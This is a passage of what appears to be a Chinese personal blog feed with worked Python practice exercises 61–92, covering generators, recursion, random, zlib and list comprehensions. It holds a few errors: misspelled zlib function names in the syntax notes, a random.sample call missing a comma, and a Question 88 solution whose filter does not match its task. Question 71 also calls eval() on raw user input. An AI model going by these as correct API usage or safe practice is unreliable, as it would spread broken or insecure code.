个数，都打印</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">produce_list</span>():</span></span><br><span class="line">    res = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        res.append((i**<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(res[<span class="number">5</span>:])</span><br><span class="line"></span><br><span class="line">produce_list()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python 练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Question 61-70</title>
    <url>/2022/07/05/Question%2061-70/</url>
    <content><![CDATA[<p>项目地址：<a
href="https://github.com/ReganQing/Python-programming-exercises/blob/master/100%2B%20Python%20challenging%20programming%20exercises%20for%20Python%203.md">Python-programming-exercises/100+
Python challenging programming exercises for Python 3.md at master ·
ReganQing/Python-programming-exercises · GitHub</a></p>
<p>分为三个等级：</p>
<ol type="1">
<li>easy</li>
<li>medium</li>
<li>hard</li>
</ol>
<span id="more"></span>
<h1 id="question-61">1. Question 61</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>打印 unicode 编码的 'hello world'</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">u_s = <span class="string">u&#x27;hello world&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(u_s)</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li><code>u'str'</code> 表示的就是 unicode 编码</li>
</ul>
<h1 id="question-62">2. Question 62</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>将 ASCII 的字符串转为 utf-8 编码</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>()</span><br><span class="line">u = <span class="built_in">str</span>(s)</span><br><span class="line"><span class="built_in">print</span>(u)</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong></p>
<ul>
<li>Python3.x 没有 Unicode 函数，转为了 str 函数；</li>
<li>str 函数默认就是 utf-8 编码</li>
</ul>
<h1 id="question-63">3. Question 63</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>写一个特殊的注释，以表明 Python 文件是 unicode 编码。</li>
</ul>
<p><strong>代码</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure>
<ul>
<li>写在一个文件的最开始</li>
</ul>
<h1 id="question-64">4. Question 64</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>给定一个 n，计算 1/2 + 2/3 + ... + n/(n+1) 的结果</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>):</span><br><span class="line">    res += i/(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h1 id="question-65">5. Question 65</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>计算 f(n) = f(n-1) + 100，f(n) = 0。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> func(n-<span class="number">1</span>) + <span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func(<span class="built_in">int</span>(<span class="built_in">input</span>())))</span><br></pre></td></tr></table></figure>
<h1 id="question-66">6. Question 66</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给定一个整数 n，计算对应的斐波那契数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> fibonacci(n-<span class="number">1</span>)+fibonacci(n-<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fibonacci(<span class="built_in">int</span>(<span class="built_in">input</span>())))</span><br></pre></td></tr></table></figure>
<h1 id="question-67">7. Question 67</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>给定一个整数 n，返回从 0 到 n 的所斐波那契数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> fibonacci(n-<span class="number">1</span>)+fibonacci(n-<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">res = [fibonacci(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n+<span class="number">1</span>)]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h1 id="question-68">8. Question 68</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给定一个整数 n，使用生成器来打印 [0, n] 之间的所有偶数。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_even_num</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">yield</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">f = get_even_num(n)</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> even_num <span class="keyword">in</span> f:</span><br><span class="line">    res.append(<span class="built_in">str</span>(even_num))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(res))</span><br></pre></td></tr></table></figure>
<h1 id="question-69">9. Question 69</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给定一个整数 n，使用生成器来打印 [0, n] 之间所有能同时被 5 和 7
整除的数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_num</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        <span class="keyword">if</span> (i%<span class="number">5</span>==<span class="number">0</span>) <span class="keyword">and</span> (i%<span class="number">7</span>==<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">yield</span> i    </span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> get_num(n):</span><br><span class="line">    res.append(<span class="built_in">str</span>(num))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(res))</span><br></pre></td></tr></table></figure>
<h1 id="question-70">10. Question 70</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>使用 <code>assert</code> 来判断列表 [2,4,6,8]
里面的数是否为偶数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="keyword">assert</span> num%<span class="number">2</span>==<span class="number">0</span></span><br></pre></td></tr></table></figure>
<h2 id="assert">10.1. assert</h2>
<p>作用：判断表达式是否正确</p>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> expression</span><br></pre></td></tr></table></figure>
<p>返回值：正确则代码继续执行，错误则抛出异常
<code>AssertionError</code></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python 练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Question 71-80</title>
    <url>/2022/07/06/Question%2071-80/</url>
    <content><![CDATA[<p>项目地址：<a
href="https://github.com/ReganQing/Python-programming-exercises/blob/master/100%2B%20Python%20challenging%20programming%20exercises%20for%20Python%203.md">Python-programming-exercises/100+
Python challenging programming exercises for Python 3.md at master ·
ReganQing/Python-programming-exercises · GitHub</a></p>
<p>分为三个等级：</p>
<ol type="1">
<li>easy</li>
<li>medium</li>
<li>hard</li>
</ol>
<span id="more"></span>
<h1 id="question-71">1. Question 71</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>输入一串字符类型的数学表达式，计算其结果并打印</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(<span class="built_in">str</span>))</span><br></pre></td></tr></table></figure>
<h1 id="question-72">2. Question 72</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>实现二分查找</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span>(<span class="params">num_list, find_num</span>):</span></span><br><span class="line">    high = <span class="built_in">len</span>(num_list) - <span class="number">1</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> num_list[mid] == find_num:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">        <span class="keyword">elif</span> num_list[mid] &gt; find_num:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">lst = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(bin_search(lst, <span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(bin_search(lst, <span class="number">128</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>查找成功返回下标；</li>
<li>查找失败返回 -1</li>
</ul>
<h1 id="question-73">3. Question 73</h1>
<p>同上</p>
<h1 id="question-74">4. Question 74</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>使用 random.random() 函数随机生成一个 10~100 之间的浮点数。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="built_in">print</span>(random.random() * <span class="number">90</span> + <span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>random.random() 默认生成一个 0~1 之间的浮点数</li>
</ul>
<h1 id="question-75">5. Question 75</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>使用 random.random() 函数随机生成一个 5~95 之间的浮点数。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="built_in">print</span>(random.random() * <span class="number">90</span> + <span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<h1 id="question-76">6. Question 76</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>使用 random 模块和 list 随机返回一个 0~10之间的偶数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">even_list = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>) <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(random.choice(even_list))</span><br></pre></td></tr></table></figure>
<h2 id="random.choice">6.1. random.choice()</h2>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.choice(seq)</span><br></pre></td></tr></table></figure>
<p>作用：从非空 seq 中随机返回一个元素，如果 seq 为空则引发
IndexError</p>
<h1 id="question-77">7. Question 77</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>随机返回一个在 0~200 之间能被 5 整除，也能被 7 整除的数字。使用
random 模块和 list</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">available_nums = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">201</span>) <span class="keyword">if</span> (x%<span class="number">5</span>==<span class="number">0</span>) <span class="keyword">and</span> (x%<span class="number">7</span>==<span class="number">0</span>)]</span><br><span class="line"><span class="built_in">print</span>(random.choice(available_nums))</span><br></pre></td></tr></table></figure>
<h1 id="question-78">8. Question 78</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>随机生成一个列表，有 5 个数字，每个数字都在 [100, 200] 之间</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">nums = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">201</span>)]</span><br><span class="line"><span class="built_in">print</span>(random.sample(nums, <span class="number">5</span>))</span><br></pre></td></tr></table></figure>
<h2 id="random.sample">8.1. random.sample()</h2>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.sample(population, k, counts=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
<p>作用：</p>
<ul>
<li>从 population 集合中取出 k 个元素形成一个列表并返回。population
集合中的同一个元素（<strong>多个相同值的元素 !=
同一个元素</strong>）不会被选择 2 次及以上。</li>
</ul>
<p>如果 population
中有多个相同的元素，比如为：<code>['hello', 'hello', 'hello', 'hello', 'hello', 'world', 'world']</code>，此时一下两者等价：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">第一种：random.sample([<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>, <span class="string">&#x27;world&#x27;</span>], <span class="number">3</span>)</span><br><span class="line">第二种：random.sample([<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>], <span class="number">3</span> counts=[<span class="number">5</span>, <span class="number">2</span>])</span><br></pre></td></tr></table></figure>
<p>这就是 counts 参数的作用，counts 参数的每一个值，即 population
中的对应元素的个数。</p>
<h1 id="question-79">9. Question 79</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>随机生成一个列表，有 5 个偶数，每个偶数都在 [100, 200] 之间</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">nums = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">201</span>) <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(random.sample(nums, <span class="number">5</span>))</span><br></pre></td></tr></table></figure>
<h1 id="question-80">10. Question 80</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>随机生成一个列表，有 5 个数，每个数都在 [1, 1001] 之间，且能同时被 5
和 7 整除</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">nums = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1001</span>) <span class="keyword">if</span> (x%<span class="number">5</span>==<span class="number">0</span>) <span class="keyword">and</span> (x%<span class="number">7</span>==<span class="number">0</span>)]</span><br><span class="line"><span class="built_in">print</span>(random.sample(nums, <span class="number">5</span>))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python 练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Question 81-90</title>
    <url>/2022/07/06/Question%2081-90/</url>
    <content><![CDATA[<p>项目地址：<a
href="https://github.com/ReganQing/Python-programming-exercises/blob/master/100%2B%20Python%20challenging%20programming%20exercises%20for%20Python%203.md">Python-programming-exercises/100+
Python challenging programming exercises for Python 3.md at master ·
ReganQing/Python-programming-exercises · GitHub</a></p>
<p>分为三个等级：</p>
<ol type="1">
<li>easy</li>
<li>medium</li>
<li>hard</li>
</ol>
<span id="more"></span>
<h1 id="question-81">1. Question 81</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>使用 random.randrange() 函数随机生成一个 [7, 15] 的一个整数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="built_in">print</span>(random.randrange(<span class="number">7</span>, <span class="number">16</span>))</span><br></pre></td></tr></table></figure>
<h2 id="random.randrange">1.1. random.randrange()</h2>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.randrange(start, stop[, step])</span><br></pre></td></tr></table></figure>
<p>作用：</p>
<ul>
<li>从 [start, stop) 步长为 step（默认为 1）
的列表中随机选择一个整数返回。可以等价于
<code>random.choice(range(star, stop, step))</code> 只不过 choice
中是真的需要一个 range 对象，而这里不需要</li>
</ul>
<h1 id="question-82">2. Question 82</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>使用 zlib.comporess 函数来压缩字符串 "hello world!hello world!hello
world!hello world!"，并将压缩之后的对象使用 zlib.decompress 解压缩</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="built_in">str</span> = <span class="string">b&#x27;hello world!hello world!hello world!hello world!&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">byte_data = zlib.compress(<span class="built_in">str</span>)</span><br><span class="line"><span class="built_in">print</span>(byte_data)</span><br><span class="line"><span class="built_in">print</span>(zlib.decompress(byte_data))</span><br></pre></td></tr></table></figure>
<h2 id="zlib.comprocess">2.1. zlib.comprocess()</h2>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">zlib.comprocess(data, level=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>data：字节类型的数据；</li>
<li>level：可取 0~9 或者 -1，等级越高压缩速率越慢，压缩率越高。-1
表示压缩率和压缩速率的平衡等级，可以相当于 6；</li>
</ul>
<p>作用：</p>
<ul>
<li>将 data 压缩</li>
</ul>
<h2 id="zlib.decompress">2.2. zlib.decompress()</h2>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">zlib.decomprocess(data, wbits=MAX_WBITS, bufsize=DEF_BUF_SIZE)</span><br></pre></td></tr></table></figure>
<ul>
<li>data：需要解压的 data；</li>
<li>wbits：形参控制历史缓冲区的大小（或称“窗口大小”）以及所期望的头部和尾部格式；</li>
<li>bufsize：是用于存放解压数据的缓冲区初始大小；</li>
</ul>
<p>作用：</p>
<ul>
<li>解压 data 中的字节，返回还有解压内容的 bytes 对象</li>
</ul>
<h1 id="question-83">3. Question 83</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>计算 1+1 执行 100 次的时间</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">t = timeit.Timer(<span class="string">&#x27;for _ in range(100): 1+1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(t.timeit())</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>timeit 模块提供了一种简单的方法来计算一小段 Python 代码的耗时</li>
</ul>
<h1 id="question-84">4. Question 84</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>使用 shuffle 函数来随机打乱列表 [3, 6, 7, 8]</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">lst = [<span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line"><span class="built_in">print</span>(lst)</span><br><span class="line">random.shuffle(lst)</span><br><span class="line"><span class="built_in">print</span>(lst)</span><br></pre></td></tr></table></figure>
<h2 id="random.shuffle">4.1. random.shuffle()</h2>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.shuffle(lst)</span><br></pre></td></tr></table></figure>
<p>作用：</p>
<ul>
<li>随机打乱 lst 序列的元素顺序</li>
</ul>
<p>返回值：</p>
<ul>
<li>该函数没有返回值，只是将原来的序列打乱</li>
</ul>
<h1 id="question-85">5. Question 85</h1>
<p>题目同上</p>
<h1 id="question-86">6. Question 86</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给定主语列表 ["I", "You"]，谓语列表 ["Play", "Love"]，宾语列表
["Hockey","Football"]，生成所有可能的 “主谓宾” 结构的句子</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sub_list = [<span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;You&#x27;</span>]</span><br><span class="line">verb_list = [<span class="string">&#x27;Play&#x27;</span>, <span class="string">&#x27;Love&#x27;</span>]</span><br><span class="line">obj_list = [<span class="string">&#x27;Hockey&#x27;</span>, <span class="string">&#x27;Football&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> sub <span class="keyword">in</span> sub_list:</span><br><span class="line">    <span class="keyword">for</span> verb <span class="keyword">in</span> verb_list:</span><br><span class="line">        <span class="keyword">for</span> obj <span class="keyword">in</span> obj_list:</span><br><span class="line">            sentence = sub + <span class="string">&#x27; &#x27;</span> + verb + <span class="string">&#x27; &#x27;</span> + obj</span><br><span class="line">            <span class="built_in">print</span>(sentence)</span><br></pre></td></tr></table></figure>
<h1 id="question-87">7. Question 87</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给定一个列表
[5,6,77,45,22,12,24]，使用列表生成式来生成一个新的列表，其中只有原列表中的奇数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = [<span class="number">5</span>, <span class="number">6</span>, <span class="number">77</span>, <span class="number">45</span>, <span class="number">22</span>, <span class="number">12</span>, <span class="number">24</span>]</span><br><span class="line">left_nums = [num <span class="keyword">for</span> num <span class="keyword">in</span> nums <span class="keyword">if</span> num%<span class="number">2</span>!=<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(left_nums)</span><br></pre></td></tr></table></figure>
<h1 id="question-88">8. Question 88</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给定一个列表
[12,24,35,70,88,120,155]，使用列表生成式来生成一个新的列表，其中不包括原列表中能够同时被
5 和 7 整除的数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = [<span class="number">12</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">155</span>]</span><br><span class="line">left_nums = [num <span class="keyword">for</span> num <span class="keyword">in</span> nums <span class="keyword">if</span> (num%<span class="number">5</span>!=<span class="number">0</span>) <span class="keyword">and</span> (num%<span class="number">7</span>!=<span class="number">0</span>)]</span><br><span class="line"><span class="built_in">print</span>(left_nums)</span><br></pre></td></tr></table></figure>
<h1 id="question-89">9. Question 89</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给定一个列表
[12,24,35,70,88,120,155]，使用列表生成式来生成一个新的列表，其中不包括原列表中下标为
2，2，4，6 的数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = [<span class="number">12</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">155</span>]</span><br><span class="line">left_nums = [value <span class="keyword">for</span> (index, value) <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums) <span class="keyword">if</span> (index != <span class="number">0</span>) <span class="keyword">and</span> (index != <span class="number">2</span>) <span class="keyword">and</span> (index != <span class="number">4</span>) <span class="keyword">and</span> (index != <span class="number">6</span>)]</span><br><span class="line"><span class="built_in">print</span>(left_nums)</span><br></pre></td></tr></table></figure>
<h2 id="enumerate">9.1. enumerate()</h2>
<p>语法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">enumerate</span>(seq[, start=<span class="number">0</span>] ) </span><br></pre></td></tr></table></figure>
<ul>
<li>seq：一个序列、迭代器或者可迭代对象</li>
<li>start：起始下标，默认为 0</li>
</ul>
<p>作用：</p>
<ul>
<li>得到序列的一个可迭代对象，其中每个元素都是一个元组 (index,
value)。通常用于 for 循环中</li>
</ul>
<p>返回值：</p>
<ul>
<li>序列的一个可迭代对象，元素为 (index, value) 的元组</li>
</ul>
<h1 id="question-90">10. Question 90</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>使用列表生成式生成一个 3 维的数组，维度分别为 3，5，8，所有元素都为
0</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = [[[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python 练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Question 91-100</title>
    <url>/2022/07/06/Question%2091-100/</url>
    <content><![CDATA[<p>项目地址：<a
href="https://github.com/ReganQing/Python-programming-exercises/blob/master/100%2B%20Python%20challenging%20programming%20exercises%20for%20Python%203.md">Python-programming-exercises/100+
Python challenging programming exercises for Python 3.md at master ·
ReganQing/Python-programming-exercises · GitHub</a></p>
<p>分为三个等级：</p>
<ol type="1">
<li>easy</li>
<li>medium</li>
<li>hard</li>
</ol>
<span id="more"></span>
<h1 id="question-91">1. Question 91</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给定一个列表 [12,24,35,70,88,120,155]
利用列表生成式生成一个新的列表，其中不包括原列表中的下标为 0，4，5
的元素。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = [<span class="number">12</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">120</span>, <span class="number">155</span>]</span><br><span class="line">left_nums = [value <span class="keyword">for</span> index, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums) <span class="keyword">if</span> index <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">4</span>, <span class="number">5</span>)]</span><br><span class="line"><span class="built_in">print</span>(left_nums)</span><br></pre></td></tr></table></figure>
<h1 id="question-92">2. Question 92</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>给定一个列表 [12,24,35,70,88,120,155]， 利用 remove 方法删除 24</li>
</ul>
<p><strong>代码</strong>：</p>
